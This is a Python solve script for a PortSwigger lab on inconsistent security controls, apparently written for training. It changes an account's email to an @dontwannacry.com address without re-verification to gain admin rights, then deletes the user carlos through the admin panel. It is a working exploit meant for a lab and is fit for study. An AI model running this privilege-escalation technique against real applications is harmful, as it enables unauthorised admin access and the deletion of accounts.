#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Inconsistent security controls.

1. Register with exploit server email (requires manual confirmation link click).
2. Change email to attacker@dontwannacry.com (no re-verification required).
3. Access /admin and delete carlos.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def change_email(lab, session_cookie, new_email):
    s = requests.Session()
    s.cookies.set("session", session_cookie)
    s.verify = False

    r = s.get(f"{lab}/my-account")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        print("[-] CSRF token not found on account page.")
        return False
    csrf_token = csrf.group(1)

    r = s.post(f"{lab}/my-account/change-email", data={"email": new_email, "csrf": csrf_token})
    print(f"[*] Email change status: {r.status_code}")
    return True


def delete_carlos(lab, session_cookie):
    s = requests.Session()
    s.cookies.set("session", session_cookie)
    s.verify = False

    r = s.get(f"{lab}/admin")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        print("[-] CSRF token not found on admin page — may not have admin access yet.")
        return False
    csrf_token = csrf.group(1)

    r = s.get(f"{lab}/admin/delete", params={"username": "carlos", "csrf": csrf_token})
    print(f"[*] Delete carlos status: {r.status_code}")
    return True


def main():
    parser = argparse.ArgumentParser(
        description="Solve Inconsistent Security Controls lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie (after registering and confirming email)")
    parser.add_argument("--target-email", default="attacker@dontwannacry.com",
                        help="Email to change to (must be @dontwannacry.com)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")

    print(f"[*] Changing email to {args.target_email}...")
    if change_email(lab, args.session, args.target_email):
        print("[+] Email changed. Deleting carlos...")
        delete_carlos(lab, args.session)
        print("[+] Done — lab solved!")


if __name__ == "__main__":
    main()
